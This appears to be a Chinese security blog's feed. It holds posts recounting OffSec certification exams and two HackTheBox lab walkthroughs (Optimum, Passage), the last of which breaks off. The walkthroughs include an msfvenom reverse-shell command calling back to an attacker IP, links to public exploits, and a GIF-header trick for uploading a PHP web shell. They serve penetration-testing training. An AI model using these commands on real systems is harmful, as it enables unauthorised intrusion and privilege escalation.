<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSDA考试是24小时，同样需要提交考试报告。考试会给一个控制面板，那里可以手动控制所进行的步骤，但一旦进行到了下一步，那么就不可以回退了，除非重置整个环境，但重置的时间很长，所以建议在进行相对应的步骤的时候，可以记录一下开始的时间，这样后续也可以通过筛选时间来回顾步骤内容。</p>
<p>考试不允许使用chatgpt之类的辅助工具，总共10个阶段，每个阶段满分10分，官方给出的通过分数是75分，如果有哪个阶段没有发现所有情况，那么会视发现的情况给分。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>官方教材相对来讲已经很详细了，提供给练习的Lab也足以用来备考。</p>
<p>教材的大部分会讲解各种攻击手法与权限维持的内容，后面就会讲解如何利用ELK去发现这些攻击行为，以及告警规则的编写。</p>
<p>Challenge总共有13个，由简到难，每个Challenge都有好几个阶段，通过手动开启来触发日志生成，Challenge没有flag，这就让人有点把握不住，不清楚是否找到了所有的内容，只能通过筛选来缩小查找的范围。</p>
<p>官方还提供了有专门的Challenge的讲解视频，如果有哪里是把握不住的，可以看看，这个貌似是直播录屏的内容，时间很长。</p>
<p>在官方的Discord频道也有提供相对的提示，在某个阶段，如果认为自己找全了，或者不确定的地方，可以看看官方给的提示。</p>
<p>摆烂了许久以后，我才开始备考，前面的讲解攻击手法那些我就没有看，主要是看了后面的ELK使用和告警规则编写。</p>
<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>流程还是老样子，考试总共有10个阶段，给了一些预置的规则，在进行某一阶段后，可以先看看预置的告警，适当的缩小查找范围。</p>
<p>考试时间是上午的十点开始，到晚上的八点多做完了，感觉并没有找全，但大概差不多，然后就是结束考试提交报告。</p>
<p>报告倒没怎么写文字类的东西，全都是日志截图，适当的配合一点文字说明。</p>
<p>考试的时候最好还是记录一下每个阶段开始的时间，不然到时候想回头再看看有没有遗漏就很麻烦了，日志太多根本找不到，重置一次所花费的时间也需要很久，而且重置以后也同样需要一个阶段一个阶段的走一遍，不存在可以跳阶段的情况。</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这一次的考试结果出的是真慢，我在8月24号晚上提交的报告，直到9月1号晚上才出结果。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7i0bqts8jd.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.7i0bqtu48u.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>OSWA</title>
    <url>/post/c6b738a01cb9/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWA（Web Attacks with Kali Linux），也就是WEB-200，这是一门WEB级别的基础课程，可以算是OSWE的前置课程。</p>
<p>与WEB-300不同的是，这一门课程主要是通过黑盒发现漏洞拿到flag，而WEB-300是通过白盒审计代码发现漏洞，所以会更注重于黑盒方面漏洞发现能力。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSWA考试时间也是48小时，24小时考试，24小时提交报告时间，与OSCP和其他300级别的不同的是，OSWA可以在不获取反弹shell的情况下读取flag，也就是可以从web页面、Burp Suite页面读取flag，但操作的步骤要写清楚。</p>
<p>考试中，Sqlmap和Metasploit是允许使用的，且不受次数限制，Burp Suite Pro也可以用，但其实用不上这么多，kali自带的Burp Suite社区版以及Sqlmap就足以，Msf至少在我考试时，是没有遇到过需要使用的场景。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>官方提供了8个练习靶场，第一个在教材里面会有讲解，相当于只有7个用来练习的。</p>
<p>考察方向基本就是web方面的常见漏洞，其中会有部分情况需要利用多个不同漏洞组合才能达到预期效果。</p>
<p>教材中的章节大多都会带一些练习题，如果对于部分漏洞掌握不是很熟练的话，可以在教材中针对性的练习一下。</p>
<p>从开始到预约考试，正儿八经花的时间并没有很多，有很多时间都是因为懒，不想做导致的拖延。</p>
<p>OSWA是没有奖励分的，就算把靶场和教材的练习全部做完，也不会有类似OSCP的十分奖励积分。</p>
<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>在连接考试的VPN后，控制面板那里会给出目标机器的IP地址，同样还是先做扫描，基本都是web端口，没有其他多余的服务。</p>
<p>要完整的做完一台机器，分为两部分，这里和OSWE类似，一部分绕过身份验证，绕过之后进入管理后台，第一个flag就会直接在页面上，第二部分进入管理后台之后拿到第二个flag，这里不一定是需要反弹shell回来拿flag，flag就在网页目录下，通过web漏洞去拿也是可以的。</p>
<p>难度倒不是很高，只是漏洞利用点有时候藏得很深，需要不断地枚举，这一部分相当耗费时间。</p>
<p>考试时间是从10月12号上午开始，下午基本就做完了，100分的总分，70分即可通过，一个flag算10分，最终拿到了9个flag，最后一个已经枚举的有点烦了，就没打算继续。</p>
<p>当天结束考试后，写完报告提交，审核速度相当慢，直到20号的下午才收到考试通过邮件。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.45okz40yn.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.361km7688v.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>考试不难，枚举麻烦，这一门课程可以用来当作WEB-300的前置，WEB-300中有许多利用技巧在这门课程中有讲解。</p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>OSEP</title>
    <url>/post/f6f3ecf8ed94/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSEP（OffSec Experienced Pentester）是继OSCP后更高一级的认证，相较于OSCP的内容来说，新增了防御规避，以及OSCP中缺少的Windows域内相关内容。</p>
<p>OSCP中的域内容比较少，而且较为基础，不会涉及委派攻击，特权滥用，域信任等。</p>
<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>在还没准备考OSEP之前，就看过不少与之对比的其他课程，例如CRTO、CRTP等。</p>
<p>相较于这二者，OSEP的内容可能相对比较“老旧”，根据官方信息来看，上一次更新OSEP还是在21年，所以，其中的一些防御规避技术可能不太适用于如今的对抗环境，但思路还是非常不错的。</p>
<p>而其他内容，CRTP我没有了解过，OSEP中的Windows域的内容与之CRTO大差不差，CRTO比OSEP多了一个ADCS的内容。</p>
<p>CRTO的教学模式是教你怎么利用Cobalt Strike来进行完成攻击，教材很精简，视频也只有寥寥几个，但与之相对的OSEP的内容则显得丰富不少，有些地方真的讲的很细，生怕学员不理解，并且对于一些操作，也会做出适当的解释，知其然而知其所以然。</p>
<h1 id="报名"><a href="#报名" class="headerlink" title="报名"></a>报名</h1><p>这个就不再赘述了，还是同样联系官方销售即可。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>报名后即开始备考，首先还是先把教材先过一遍，在之后去做18个类似课后练习的题目，之后才去做的Challenge。</p>
<p>在做Challenge的时候，还是碰到不少需要用到OSCP内容的地方，例如权限提升，以及信息收集等，这些OSEP都不会再赘述，所以如果没有基础，或者基础不是很好，想直接上OSEP的话，需要先去掌握一下这方面的内容。</p>
<p>做完Challenge后，对考试还是不够自信的话，可以再去HackTheBox的Pro Labs里练练手，其中Cybernetics可以说是非常贴合OSEP的考试内容了，只是多了一个ADCS的内容，但也不会很难。</p>
<p>Challenge中，会遇到机器开启安全机制的情况，就默认按照所有机器都有这种情况来做就好，测试Bypass AV的时候，先从简单的开始，这样更容易理清顺序。</p>
<p>同时，不要只看着教材里面的那些防御规避的内容，如果在考试的时候，方法无效，那就抓瞎了，可以先在Challenge中多测试几种手法，做好记录，以防考试途中出现意外情况。</p>
<p>差不多在3月15号，将6个Challenge全部完成了。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.4qr3qhzq60.8z6cd7b54a.webp"
                     
                ></p>
<p>完成Challenge后，预约了4月3号的考试，在此期间闲的没事干，找另外一个师傅拼了一个月的Pro Labs练练手。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/imagep.2krp4w5ob8.webp"
                     
                ></p>
<p>Pro Labs的共享环境是真折磨心态，每次打的好好的，突然来个人重置一下机器，前面的代理机器重置了，后续的全没了，最后也是被折磨的打不下去了。</p>
<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>考试时间是72小时，48小时考试，24小时报告提交时间。</p>
<p>4月3号当天早上9点开考，还是同样的流程，开摄像头，验证身份，共享屏幕。</p>
<p>考试难度与Challenge相比大差不差，可能个别地方会稍难一点，但只要细心一点都可以做得出来，从3号上午九点一直到4号晚上11点，期间只睡了3、4个小时，拿下了13个flag。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.8ojh7cdo7v.webp"
                     
                ></p>
<p>本来想继续的，但奈何4号晚上11点的网络巨卡，不知道是我的网络卡还是他们的网络卡，我重置了整个环境都不行，远程桌面登录机器，三秒钟就会卡断掉，心态崩溃，加之睡眠不足，身体也很疲倦，就索性结束了考试。</p>
<p>第二天起床整理报告，于下午两点左右提交。</p>
<p>最终在4月9号下午两点半的时候收到通过邮件。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.syq9utr3i.png"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.99t4ti5oms.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>其实考试并没有会超出教材很多，只在个别地方会稍难一点，总体来说还是可以依靠教材讲的内容解决的。</p>
<p>最主要的还是枚举与信息收集。</p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>OSWE</title>
    <url>/post/0ff59a9e0ce4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWE（Advanced Web Attacks and Exploitation），也称WEB-300，是组成OSCE3三部分中的其中一部分，主要内容为白盒审计，涉及语言相对广泛，目前主流的，例如：C#、Java、Nodejs等都有涉及。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSWE是一个考验白盒审计的课程，在考试期间，不会被允许使用自动化工具，也不会允许使用审计工具，无论是开源、商用、或是自己写的，都不会被允许。</p>
<p>考试期间，也不允许将考试的源代码下载到本地。</p>
<p>最终提交的报告，需要带有漏洞发现，漏洞利用，及python自动化脚本。</p>
<p>python自动化脚本的要求是在运行后，不需要用户进行交互，即可获取反弹shell，除去手动开启nc监听，这个只需要在报告里写出nc监听的具体命令。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>虽然前面有OSCP和OSEP的一些学习经验，但我从未真正意义上的进行过白盒审计代码。</p>
<p>考试最终需要提交一个自动化脚本，这个不强制要求为python，我选择python只是因为它相对于其他语言来讲，上手难度会低一点。</p>
<p>考试代码量不会特别多，基本上从头到尾全部看一遍是完全可以的。</p>
<p>课程内的一些漏洞，都是较为经典漏洞，官方会从发现，到利用开始，详细的讲解整个漏洞的利用过程，以及为何会产生漏洞的原因，这点像对于我这种没有经历过白盒审计的人来讲，是非常友好的。</p>
<p>教材内，还有几章是Offsec官方他们自己提交的一些CVE漏洞，看完只觉得难度太高，如果换我来，我是绝无可能发现这些漏洞的，但在学习的过程中，还是觉得酣畅淋漓，这些思路是从未设想过的，仿佛打开了新世界的大门。</p>
<p>OSWE中的教材，有几章是在末尾有对应的Lab练习题，而Challenge只有三个：Answers、DocEdit、Speark，前两个是白盒，第三个为黑盒，虽然是黑盒，但还是会给一点代码，可以算是灰盒，这三个Challenge都没有flag，能拿到shell就算打完，而这三个Challenge，每个都有好几种做法，可以多尝试几种，这样也可以对源码有更进一步的了解。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.esblj7xyx.png"
                     
                ></p>
<p>在4月10号开始看教材学习，本打算预约的是6月7号，端午节前一天考试，但在4月底的时候，发现教材和习题已经全部做完了，lab也打过了，如果要在端午节考试的话，这期间一个月是相当于没有事情做的，索性将考试提前，预约了5月2号上午八点的考试。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/f6f8de0030f61f8e6fcc0032a5b4b586.7p3q48vx1.webp"
                     
                ></p>
<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>流程还是一样的，开摄像头，验证身份，等待监考发vpn连接文件。</p>
<p>拿到vpn后，链接上去，他会给5台机器，1台kali调试机器，另外两台目标机器，以及与之相对应的两台调试机器，这两台调试机器是和目标机器一致的，在调试机器上发现的漏洞，在目标机器都会有。</p>
<p>先访问web，黑盒看了一遍，没有什么可利用的点，随即就远程链接到调试机，开始白盒看代码。</p>
<p>从路由开始一个一个看，很快啊，我就掉到一个兔子洞了，我在那里折腾了四、五个小时，后面我才感觉，这个应该不会是可利用的地方，然后继续看源码。</p>
<p>考试是上午八点开始，到第二天的上午六、七点，才发现漏洞，绕过了身份验证，此时我预感，这次八成要补考了。</p>
<p>绕过身份验证后，也是立马继续查找可能可以rce的利用点，这次非常快，只用了半个小时不到就找到了漏洞，并验证成功，拿下了第一台机器。</p>
<p>后续也就是将利用过程写成python自动化脚本，由于还有一台机器，我只简单的写了一下，随即就去奋战第二台机器。</p>
<p>第二台这里很是顺利，也有一部分的运气因素，我在看路由文件的时候，一眼就相中了一个地方，然后就是跟进，一步一步看执行流程，没想到一次就中。</p>
<p>在不断的验证后，在晚上的十点左右，验证成功，立马就拿去目标机器测试，同样成功，此时还差rce，但分数已经足够通过考试，当时状态很差，加上本身我的代码审计水平也不好，我就没打算继续往下看。</p>
<p>在将两台机器的利用脚本写完，将对应的机器重置后，测试脚本正常运行，我便结束了考试。</p>
<p>第二天睡醒后才提交的报告，这次成绩出的很快，在报告提交后的第二天，也就是5号下午，我就收到了通过邮件。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.4xucojhkjx.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.6m3plqaa65.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>考试的漏洞利用不会很难，但是发现漏洞，以及部分情况下需要将漏洞组合利用会稍微费点时间，需要有耐心，不断地去尝试，去摸索。</p>
<p>至此，OSCE3只差最后一门OSED，这是我从未接触过的领域，希望不会将我折磨得太惨。</p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>Optimum - HackTheBox</title>
    <url>/post/df1cb0655855/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.3274qadzcnc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.100scqc7unnk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.2u4rebewlao0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.2wtuh4vqxqk0.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.250rgvo8jq1s.webp"
                     
                ></p>
<p>HttpFileServer 2.3</p>
<p>有了版本和名字，搜一下有无exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.5cqkt8hynqc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.4wnsrt00m3e.webp"
                     
                ></p>
<p>将ip修改一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.4crz1icfnv20.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.5n1vw3cbbdk0.webp"
                     
                ></p>
<p>尝试过后最终MS16-032可用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.5rmf3bd7who0.webp"
                     
                ></p>
<p><code>https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1</code></p>
<p>将powershell脚本让靶机远程请求执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.20osno4p8hq8.webp"
                     
                ></p>
<p>导入MS16-032</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.68xw5pshyaw0.webp"
                     
                ></p>
<p>这个问题是由于反弹的shell是32位的，而这个提权工具则是需要64位运行，修改一下反弹的powershell，让其反弹64位的shell</p>
<p><code>C:\Windows\sysnative\WindowsPowerShell\\v1.0\powershell.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.46enfc1tndk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.2rgd4ri2wxm0.webp"
                     
                ></p>
<p>貌似直接执行不行，msf生成一个反弹shell后门，在修改提权脚本，让其执行msf后门</p>
<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=7777 -f exe -o rever.exe</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.2ze7epe6izy0.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.3inho4uq79c0.webp"
                     
                ></p>
<p>修改提权脚本</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.1xwnoymmv0u8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.2ycap3t6l2s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Optimum/image.4kf6hn3427w0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>OSWP</title>
    <url>/post/e2351bb11e1e/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSWP（Foundational Wireless Network Attacks），也称PEN-210，从命名来看，就可以知道，这是一个基于无线网络攻击的基础课程。</p>
<p><del>其实这门课没什么好讲的，我主要是为了凑一下文章数。</del></p>
<p>课程内容主要涉及Wifi协议，认证方式，认证方式的攻击等。</p>
<p>这门课程会在购买Learn One或者Learn Unlimited套餐赠送考试机会，也可以单独购买。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>OSWP考试只有四小时，可以算是目前来说我经历过的最短时间的考试，但时间是足够的，考试会给三个目标，其中有一个是必须拿下的，另外两个任意选一个做出来就算通过考试。</p>
<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>offsec官方并没有给这门课程配套相应的Lab提供练习，这门课程只有教材以及视频，如果想要练习，需要自己购买路由器，或者可以找一些类似靶场练习。</p>
<p>我在五月八号看了下教材，约了第二天九号晚上八点的考试，九号白天在<a class="link"   href="https://wifichallengelab.com/" >Wifichallenge<i class="fas fa-external-link-alt"></i></a>靶场做了下练习，这个靶场会给出不同场景的Wifi认证模式的攻击方式，可以熟悉一下Wifi攻击所使用到的一些工具，而且这个靶场会给出对应题目的WP，如果有题目不会做，没有思路，都可以参考WP来操作。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.2obcbrs4gq.png"
                     
                ></p>
<h1 id="考试"><a href="#考试" class="headerlink" title="考试"></a>考试</h1><p>流程与其他考试一致。</p>
<p>考试会给一个操作机器kali，要求所有操作都要在他们提供的考试机器kali上进行，其实也没有办法不在他们给的机器上做题目，因为需要连接目标Wifi。</p>
<p>这次的考试非常的简单，从八点开始，到晚上十点半我就结束了考试，这期间基本没有遇到卡住的地方，费时间的唯一地方就是他们提供的机器ssh上去延迟比较高。</p>
<p>同时在十一点前提交了考试报告，这次效率也很快，第二天上午就可以在预约考试页面看到通过结果，但迟迟没有等到邮件，直到晚上的十一点多才收到通过邮件。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.b8pukm36c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/image/image.5tquapvazr.webp"
                     
                ></p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>讲道理，这门课确实过于基础，可能是限于物理设备，offsec并没有讲的很深入，这门课我并不推荐单独购买课程，如果实在想要，可以报一个Learn One套餐，任选一门课，附赠一次OSWP考试机会。</p>
]]></content>
      <tags>
        <tag>OffSec</tag>
      </tags>
  </entry>
  <entry>
    <title>Passage - HackTheBox</title>
    <url>/post/36d451523fa9/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.487jdw8vryw0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.5bxfkv9ehn80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.1jss3xqlvobk.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.2jtqyadc9ho0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.4m7o9rjayfs0.webp"
                     
                ></p>
<p>感觉这是个注入</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.565dmb9mxf40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.32ouryynmzc0.webp"
                     
                ></p>
<p>不是注入</p>
<p>扫个目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.3c5jgbj242g0.webp"
                     
                ></p>
<p>这个站点有防护措施，只要一开扫，就会被封禁一段时间</p>
<p>那就只能手动找了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.5jqn964t5g00.webp"
                     
                ></p>
<p>这里好像有另外的目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.6nzxr6njyz40.webp"
                     
                ></p>
<p>没什么可利用信息，看看他上级目录有没有东西</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.7wa5sh6op0w.webp"
                     
                ></p>
<p>一个登录框，注册进去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.3zjeo9adjbu0.webp"
                     
                ></p>
<p>还是没什么可利用信息，但发现了cms的名称CuteNews和版本，看看有没有可利用exp</p>
<p><code>https://www.exploit-db.com/exploits/48800</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.4govihkxbi40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.2y4wuek1wpi0.webp"
                     
                ></p>
<p>上传一个php文件造成rce，这payload貌似只要加GIF8到文件最开端好像就可以绕过，手动试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.63ep802vz9o0.webp"
                     
                ></p>
<p>这里有上传点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.5u4zy8dj4os.webp"
                     
                ></p>
<p>头部添加GIF8;</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.58dbx3rqr740.webp"
                     
                ></p>
<p>成功上传，访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.d5q66ggm79k.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.7hudkem52oo0.webp"
                     
                ></p>
<p>在网站目录下发现users文件夹，内部包含很多php文件，内容为base64编码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.btoctemhj3c.webp"
                     
                ></p>
<p>解码后貌似是一些用户信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.1agiy0bgrukg.webp"
                     
                ></p>
<p>21.php解码后貌似是个admin用户的哈希加密密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.bb5y9bundw0.webp"
                     
                ></p>
<p>尝试解密</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.6hxqov6y8f40.webp"
                     
                ></p>
<p>解不开，继续找</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.1i5wdjnwxk9s.webp"
                     
                ></p>
<p>b0.php解码后是paul用户和加密哈希密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.2qyn32wogc80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Passage/image.413j5l4zx020.webp"
                     
                ></p>
<p>这个可以解开，而且passwd中存在paul用户，尝试切换</p>
<p><img  
                     lazyload
                     alt="image"
